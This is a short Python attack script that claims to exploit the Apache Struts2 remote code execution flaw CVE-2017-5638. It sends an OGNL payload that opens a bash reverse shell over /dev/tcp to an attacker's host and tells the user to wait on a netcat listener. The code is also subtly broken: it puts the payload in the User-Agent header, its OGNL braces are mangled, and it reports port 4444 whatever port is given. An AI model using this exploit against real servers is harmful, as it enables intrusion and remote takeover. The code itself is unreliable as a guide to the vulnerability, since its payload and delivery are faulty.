import requests
import time
import threading

def struts2_exploit(target, lhost, lport):
    """CVE-2017-5638 Struts2 RCE"""
    payload = f"%{{(#a=@java.lang.Runtime@getRuntime().exec('bash -c {{bash,-i,&>/dev/tcp/{lhost}/{lport},<{{bash,-i,&>/dev/tcp/{lhost}/{lport}}}}'}}).(#b=@java.lang.ProcessBuilder@new(#a).(#c=@java.lang.ProcessBuilder@new('bash','-c','bash -i >& /dev/tcp/{lhost}/{lport} 0>&1')).start())}}"
    
    headers = {
        'User-Agent': payload
    }
    
    try:
        r = requests.get(f"http://{target}", headers=headers, timeout=10)
        print(f"[+] Struts2 payload sent to {target}:4444")
        print("[*] Check your netcat listener: nc -lvnp 4444")
    except:
        print("[-] Struts2 exploit failed")

def run_rce(target, lhost, lport=4444):
    print(f"[+] Executing RCE against {target}")
    struts2_exploit(target, lhost, lport)